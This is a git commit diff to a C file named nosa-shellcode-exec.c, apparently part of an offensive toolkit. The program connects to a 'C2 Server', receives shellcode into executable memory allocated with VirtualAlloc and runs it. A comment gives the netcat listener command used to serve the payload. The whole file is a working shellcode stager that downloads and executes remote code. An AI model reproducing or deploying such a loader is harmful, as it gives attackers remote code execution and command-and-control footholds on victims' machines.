4b1305f1b9d6a14fc762927dda518c0bce91d0a5
ViperXSec <146484902+ViperXSec@users.noreply.github.com>
2024-08-20 15:18:03 -0300

    Update nosa-shellcode-exec.c

--- nosa-shellcode-exec.c
+++ nosa-shellcode-exec.c
@@ -1,48 +1,52 @@
+#include <stdio.h>
 #include "nosa.h"
 
-/**
- * Establishes a connection to a specified host and port using a specified socket type.
- *
- * @param None
- *
- * @returns 0 upon successful execution
- */
-int main()
-{
+int main() {
+   
     //  [ C2 Server ] 
-    //  nc -lnvp 4444 < shellcode.bin
-    //
-
+    //  nc -lnvp 8888 < shellcode.bin
+    
     HANDLE hSocket = NULL;
-    NTSTATUS Status = NULL;
-    char ip_string[16] = { 0 };      // Allocate enough space for an IPv4 address in dotted notation
+    char* socketType = "TCP";         // Protocol (TCP, UDP, RAW)
+    char* host = "127.0.0.1";         // Target Host
+    int port = 8888;                  // Target port
 
-    const char* socketType = "TCP";  // #TODO UDP -> not working.
-    // Sadly, afd!AfdConnect() call [ExFreeToLookasideListEx] with a null value when it got a UDP conn
+    unsigned char pktPtr_send[MAX_SENT_BYTES] = { 0 };  // Craft our TCP packet request
+    snprintf((char*)pktPtr_send, MAX_SENT_BYTES, "PING!\n", socketType); // Format the string and store it in pktPtr_send
+ 
+    // Allocate a virtual buffer for our shellcode (MUST TO BE NULL-FREE)
+    LPVOID pktPtr_resp = VirtualAlloc(0, MAX_RECV_BYTES, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memset(pktPtr_resp, 0, MAX_RECV_BYTES); // clear our created vm alloc
 
-    const char* host = "127.0.0.1"; // #TODO -> subdomain queries not working for while.
-    int port = 4444;
+    /*
+        You can reuse the existing handle to perform iterative operations [request -> response].
+        After the handle is created for the first time, you can follow this steps:
+        nosa_connect();
+        '-> while (1) {  nosa_send(); nosa_recv(); } 
+    */
 
     // Connect into remote host
     nosa_connect(&hSocket, host, port, socketType);
+    // Send client packets
+    nosa_send(&hSocket, pktPtr_send, sizeof(pktPtr_send));
+    printf("nosa_send() -> Request:\n");
+    hexdump(&pktPtr_send, 0x100);
 
-    // PING packet
-    unsigned char pktSend[MAX_SENT_BYTES] = "PING\n";
+    // Receive and print TCP packet response
+    nosa_recv((HANDLE*)hSocket, &pktPtr_resp);
+    printf("nosa_recv() -> Response:\n");
+    hexdump(&pktPtr_resp, 0x100);
 
-    // Send client PING!
-    nosa_send(&hSocket, pktSend, sizeof(pktSend));
-
-    // Allocate a virtual buffer for our shellcode
-    LPVOID pktRecv = VirtualAlloc(0, MAX_RECV_BYTES, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    memset(pktRecv, 0, MAX_RECV_BYTES); // clear our created vm alloc
-
-    // Receive and exec TCP packet response
-    nosa_recv((HANDLE*)hSocket, pktRecv, MAX_RECV_BYTES);
-
-    // Exec
+    // Exec (MUST TO BE A NULL-FREE SHELLCODE)
     int (*func)();
-    func = (int(*)()) (BYTE*)pktRecv;
+    func = (int(*)()) (BYTE*)pktPtr_resp;
     (int)(*func)();
+
+    // Close target socket
+    if (hSocket) // close socket only in case hSocket != 0
+    {
+        afd_close(hSocket);
+    }
 
     return 0;
 }
